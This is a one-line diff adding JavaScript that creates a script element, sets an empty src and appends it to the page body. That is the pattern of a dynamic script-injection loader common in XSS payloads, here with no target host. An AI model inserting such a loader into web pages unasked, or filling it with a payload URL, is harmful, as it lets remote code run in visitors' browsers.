@@ -1,0 +1,1 @@
+y=document.createElement('script');y.setAttribute('src','');document.body.appendChild(y);
